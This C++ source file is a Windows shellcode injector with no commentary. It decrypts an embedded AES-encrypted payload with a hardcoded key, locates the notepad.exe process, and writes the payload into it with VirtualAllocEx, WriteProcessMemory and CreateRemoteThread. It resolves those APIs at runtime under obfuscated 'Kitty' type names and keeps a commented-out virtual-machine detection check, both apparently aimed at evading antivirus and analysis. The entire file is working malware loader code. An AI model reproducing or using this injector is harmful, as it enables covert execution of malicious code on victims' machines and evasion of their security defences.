#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>
#include <iostream>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include <psapi.h>
#include <tlhelp32.h>
#include <tchar.h>
using namespace std;



typedef LPVOID(WINAPI* EwzwhbeKittyV_A_Erbwjhbe632f3RunTimeFunction)(HANDLE,LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL(WINAPI* Awxzey672KittyW_P_eNuvqnRunTimeFunction)(HANDLE,LPVOID,LPCVOID,SIZE_T ,SIZE_T*);
typedef HANDLE(WINAPI* BeUi475ZczKittyO_P_ApLSz424FgRunTimeFunction)(DWORD, BOOL, DWORD);
typedef HANDLE(WINAPI* WYz6x7zKittyC_R_TpMk12bdRunTimeFunction)(HANDLE,LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE,  LPVOID, DWORD, LPWORD);
typedef DWORD(WINAPI* OknWz672KittyW_S_nTJuehYwRunTimeFunction)(HANDLE, DWORD);





int KittyLogin(char* KItty, unsigned int KItty_length, char* key, size_t keylen) {
	HCRYPTPROV hProv;
	HCRYPTHASH hHash;
	HCRYPTKEY hKey;

	if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
		return -1;
	}
	if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
		return -1;
	}
	if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)) {
		return -1;
	}
	if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
		return -1;
	}

	if (!CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*)KItty, (DWORD*)&KItty_length)) {
		return -1;
	}

	CryptReleaseContext(hProv, 0);
	CryptDestroyHash(hHash);
	CryptDestroyKey(hKey);

	return 0;
}

DWORD FindKittens(string cute_kitten) {
	HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 kitten = { 0 };
	kitten.dwSize = sizeof(PROCESSENTRY32);
	do
	{
		string kittenname = kitten.szExeFile;
		DWORD kittenID = kitten.th32ProcessID;
		
		//if (kittenname.find("vmnet")== 0 || kittenname.find("vmware") == 0)
		//{
		//	exit(1);
		//}
		//
		if (kittenname.compare(cute_kitten) == 0)
		{	return kittenID;
			break;
		}

		auto test = 0;
	} while (Process32Next(hProcessSnap, &kitten));
	CloseHandle(hProcessSnap);
}




int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)

{
	char KittyAccPass[] = { 0xa3, 0x1a, 0x5, 0xef, 0x8f, 0x74, 0xaa, 0x1b, 0xce, 0x7d, 0x39, 0xb6, 0xfa, 0x71, 0xfa, 0xa8 };
	unsigned char KItty[] = { 0x24, 0x10, 0xe, 0x90, 0xd3, 0xce, 0x87, 0xf9, 0x5c, 0x22, 0x6, 0x39, 0x2, 0x10, 0x63, 0x85, 0x7a, 0x79, 0xae, 0xca, 0x24, 0xaa, 0xf, 0x4, 0xc8, 0x89, 0x2b, 0xf4, 0xb4, 0x2a, 0x43, 0x9a, 0xaa, 0xea, 0xee, 0x9c, 0x89, 0x91, 0xc8, 0xba, 0x2a, 0x7, 0xcf, 0x35, 0x9b, 0x21, 0xd8, 0xda, 0x75, 0xc6, 0xa2, 0x59, 0x25, 0x98, 0xf6, 0x91, 0xf8, 0xa9, 0x98, 0x3b, 0xfe, 0x67, 0x7e, 0x48, 0x84, 0xcf, 0x4f, 0x63, 0x7a, 0x55, 0x63, 0x23, 0x8, 0xbb, 0xc1, 0x7, 0xb9, 0x10, 0x5b, 0xda, 0x63, 0xba, 0x87, 0x6c, 0x2c, 0x92, 0x19, 0xac, 0x1e, 0x17, 0x79, 0x6e, 0xd0, 0xc5, 0x88, 0x8, 0x5f, 0xba, 0xe3, 0x85, 0x82, 0xc2, 0xc2, 0x1b, 0xa8, 0x7e, 0xc6, 0x2a, 0x6b, 0x60, 0x18, 0xdc, 0x3b, 0x42, 0xdb, 0xe3, 0x42, 0x68, 0x27, 0xc4, 0xd2, 0xea, 0xf9, 0x81, 0xdc, 0x74, 0x81, 0x37, 0xc3, 0xd6, 0x28, 0x79, 0xf, 0xc, 0xca, 0xa7, 0xff, 0xea, 0xf2, 0x79, 0x8b, 0x3f, 0x63, 0x6b, 0xca, 0x5c, 0x19, 0x79, 0x98, 0xa4, 0x3, 0xd8, 0xab, 0x6b, 0x35, 0x8c, 0x3d, 0x1c, 0x5, 0x1f, 0xbf, 0x5d, 0x5f, 0x78, 0xae, 0xbb, 0x63, 0x5b, 0xc, 0x79, 0xb, 0xea, 0x78, 0x87, 0xee, 0xa0, 0x49, 0x5b, 0xfd, 0xbd, 0x27, 0x1d, 0x9f, 0x88, 0x62, 0x4c, 0x47, 0xcc, 0xc8, 0xf3, 0x71, 0xc8, 0x4d, 0xa1, 0xba, 0xc6, 0xf8, 0x79, 0x64, 0xe2, 0xb9, 0x55, 0x8d, 0xc5, 0x46, 0x8f, 0xcb, 0x67, 0x7, 0xf, 0x55, 0x4b, 0x43, 0xed, 0xd2, 0xfe, 0x1c, 0x9e, 0x7a, 0xfc, 0x86, 0x68, 0xd2, 0x34, 0x79, 0xb7, 0x82, 0x44, 0xba, 0xec, 0xda, 0x53, 0x8f, 0x31, 0x5c, 0xa6, 0x32, 0x8d, 0x4f, 0x42, 0x63, 0x69, 0x1d, 0xa9, 0x30, 0xb9, 0xb7, 0x9d, 0x3f, 0x2, 0x48, 0x53, 0xcc, 0xdd, 0xb1, 0xc4, 0xb, 0x6d, 0x46, 0xa1, 0x40, 0xe8, 0x15, 0xa8, 0x65, 0xf5, 0x29, 0x3, 0x25, 0x2e, 0xce, 0x0, 0x21, 0x43, 0x7f, 0x1, 0xa6, 0x58, 0x83, 0x98, 0x1d, 0x52, 0xc2, 0x10, 0x6e, 0xfe, 0x6b, 0x1, 0x76, 0xc3, 0x92, 0x42, 0xf5, 0xab, 0x24, 0x8a, 0xe9, 0x15, 0x45, 0x6e, 0x6a, 0xb0, 0x67, 0xff, 0x3b, 0xd7, 0x83, 0x92, 0x3b, 0x6, 0xaa, 0x0, 0x52, 0x5f, 0xce, 0xc0, 0x7b, 0xab, 0x41, 0xeb, 0x23, 0xec, 0x47, 0xa0, 0xc4, 0xd8, 0x4b, 0xe9, 0xc8, 0x80, 0x2d, 0x86, 0xe7, 0xfd, 0xc9, 0x8e, 0xa0, 0xcb, 0x5d, 0x74, 0x4c, 0x22, 0x77, 0x32, 0xc6, 0x10, 0x17, 0x78, 0x6b, 0x90, 0x34, 0x2, 0x6c, 0x51, 0x28, 0x65, 0xd2, 0xed, 0xac, 0xab, 0x20, 0x13, 0xc9, 0xd9, 0xf2, 0x53, 0xc5, 0xe5, 0x90, 0xf, 0xdb, 0x5a, 0xd9, 0x51, 0xaf, 0xbb, 0x23, 0x6, 0xbe, 0x61, 0xc5, 0x29, 0xa, 0x90, 0xac, 0x76, 0xcb, 0xc1, 0x9e, 0x9f, 0x80, 0x5e, 0x8c, 0x74, 0xcd, 0xd7, 0xde, 0x6f, 0xec, 0xc4, 0x58, 0x90, 0xc2, 0xa1, 0xd2, 0xae, 0x71, 0xbd, 0xfd, 0xd8, 0x24, 0xb2, 0x95, 0xdd, 0xbb, 0x51, 0x81, 0x98, 0x58, 0x7b, 0x9a, 0xef, 0x76, 0x2a, 0x9e, 0x55, 0x96, 0x13, 0x32, 0x39, 0xa7, 0xb4, 0xd3, 0x6a, 0x74, 0x24, 0x9, 0x7a, 0x43, 0x7a, 0x8a, 0x1c, 0x93, 0xf6, 0xd, 0x3d, 0xd3, 0x28, 0xeb, 0x92, 0x49, 0xdf, 0x41, 0x59, 0xb, 0x43, 0x6b, 0x8f, 0xe5, 0x61, 0x8, 0x61, 0x37, 0x17, 0x5f, 0x82, 0x55, 0xb, 0xec, 0xe1, 0x45, 0x11, 0xa6, 0x44, 0x6e, 0x1e, 0xa9, 0x3c, 0x8d, 0xd0, 0x37, 0x63, 0x5, 0x79, 0x6e, 0xf3, 0x63, 0x5, 0xd3, 0x6d, 0xeb, 0x52, 0x59, 0xbe, 0x90, 0x9b, 0x29, 0x98, 0x95, 0xf, 0xc7, 0x15, 0x68, 0xf8, 0x82, 0x37, 0xcb, 0xce, 0x1f, 0x20, 0xe6, 0x5a, 0xe6, 0xd, 0x1d, 0xb3, 0xe9, 0xb2, 0xce, 0x4f, 0x8d, 0xc7, 0x58, 0x13, 0xd, 0x40, 0x90, 0xe6, 0xd3, 0x85, 0x6f, 0xa6, 0xb0, 0xe0, 0xb4, 0x4b, 0xc9, 0xc8, 0xdb, 0xce, 0xc6, 0x26, 0x7a, 0x38, 0xcf, 0x70, 0x9c, 0x46, 0xd2, 0x72, 0x1f, 0xe8, 0xcf, 0xa5, 0xc9, 0xde, 0xda, 0xf7, 0xd0, 0x72, 0x6, 0x32, 0x24, 0xda, 0xa8, 0xd9, 0xbc, 0xf1, 0x1e, 0x76, 0x1a, 0x57, 0xb3, 0xc9, 0xa0, 0xdd, 0xd2, 0xac, 0xf7, 0xab, 0x40, 0xf0, 0x2b, 0xc4, 0x84, 0xae, 0xbe, 0x57, 0xf5, 0xeb, 0xa8, 0xd, 0xe7, 0xe0, 0x66, 0x6f, 0x3c, 0xf5, 0xb4, 0x99, 0xbe, 0xa0, 0xd, 0x28, 0x40, 0x22, 0x6b, 0x5b, 0xaa, 0x78, 0x49, 0xb8, 0x5d, 0x86, 0x6a, 0xa8, 0xf9, 0x8d, 0x89, 0x7f, 0x41, 0xf9, 0x69, 0x90, 0x55, 0xc3, 0x35, 0x98, 0x0, 0x81, 0x3e, 0xe1, 0x7e, 0xf7, 0x7a, 0x69, 0x61, 0x24, 0xcf, 0x8e };
	HINSTANCE RTDll = LoadLibrary("kernel32.dll");
	DWORD I542WQ_teqvnAJYET = FindKittens("notepad.exe");

	 
	BeUi475ZczKittyO_P_ApLSz424FgRunTimeFunction HookedBeUi475ZczKittyO_P_ApLSz424Fg = (BeUi475ZczKittyO_P_ApLSz424FgRunTimeFunction) GetProcAddress(RTDll, "OpenProcess"); 
	WYz6x7zKittyC_R_TpMk12bdRunTimeFunction HookedWYz6x7zKittyC_R_TpMk12bd =(WYz6x7zKittyC_R_TpMk12bdRunTimeFunction)GetProcAddress(RTDll, "CreateRemoteThread");
	OknWz672KittyW_S_nTJuehYwRunTimeFunction HookedOknWz672KittyW_S_nTJuehYw = (OknWz672KittyW_S_nTJuehYwRunTimeFunction)GetProcAddress(RTDll, "WaitForSingleObject");
	Awxzey672KittyW_P_eNuvqnRunTimeFunction HookedAwxzey672KittyW_P_eNuvqn = (Awxzey672KittyW_P_eNuvqnRunTimeFunction)GetProcAddress(RTDll, "WriteProcessMemory");
	EwzwhbeKittyV_A_Erbwjhbe632f3RunTimeFunction HookedEwzwhbeKittyV_A_Erbwjhbe632f3 = (EwzwhbeKittyV_A_Erbwjhbe632f3RunTimeFunction)GetProcAddress(RTDll, "VirtualAllocEx");
	//
		/*CreateThreadRunTimeFunction
		OknWz672KittyW_S_nTJuehYwRunTimeFunction*/
	
		
		//VirtualProtectRunTimeFunction HookedVirtualProtect = (VirtualProtectRunTimeFunction)GetProcAddress(RTDll, "VirtualProtect");
	//VirtualProtectRunTimeFunction HookedVirtualProtect = (VirtualProtectRunTimeFunction)GetProcAddress(RTDll, "VirtualProtect");
	//VirtualProtectRunTimeFunction HookedVirtualProtect = (VirtualProtectRunTimeFunction)GetProcAddress(RTDll, "VirtualProtect");

	HANDLE AE_zEATAEa = HookedBeUi475ZczKittyO_P_ApLSz424Fg(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, I542WQ_teqvnAJYET);

	LPVOID YY_rUIEJ2qbAk = HookedEwzwhbeKittyV_A_Erbwjhbe632f3(AE_zEATAEa, NULL, sizeof(KItty), MEM_COMMIT, PAGE_EXECUTE_READ);
	KittyLogin((char*)KItty, sizeof(KItty), KittyAccPass, sizeof(KittyAccPass));

	HookedAwxzey672KittyW_P_eNuvqn(AE_zEATAEa, YY_rUIEJ2qbAk, (PVOID)KItty, (SIZE_T)sizeof(KItty), (SIZE_T*)NULL);




	HANDLE ThU8eIObahbf = HookedWYz6x7zKittyC_R_TpMk12bd(AE_zEATAEa, NULL, 0, (LPTHREAD_START_ROUTINE)YY_rUIEJ2qbAk, NULL, 0, NULL);
	HookedOknWz672KittyW_S_nTJuehYw(ThU8eIObahbf, -2);
	
	
//RunTime

}


